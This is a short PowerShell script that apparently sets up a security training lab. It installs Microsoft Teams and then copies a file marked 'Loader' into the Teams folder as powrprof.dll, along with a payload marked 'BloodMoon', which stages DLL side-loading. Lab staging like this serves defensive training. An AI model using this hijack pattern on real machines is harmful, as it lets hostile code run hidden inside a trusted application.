# After restart
Start-Job -ScriptBlock { Start-Process -PSPath 'C:\Program Files (x86)\Teams Installer\Teams.exe' }

# Sleep until setup is complete before copying files over
while ($true) {
    $installed = Test-path "C:\Users\pslearner\AppData\Local\Microsoft\Teams\current"
    if ($installed -eq $true) {
        break
    }
    Start-Sleep -Seconds 1
}

# Transfer files into install dir
Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\Lunar_prof.bin" "C:\Users\pslearner\AppData\Local\Microsoft\Teams\current\powrprof.dll"    # Loader
Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\ffmpeg.dat" "C:\Users\pslearner\AppData\Local\Microsoft\Teams\current\ffmpeg.dat"          # BloodMoon

echo "Done!" > C:\Users\Public\Desktop\LAB_FILES\Installed.txt
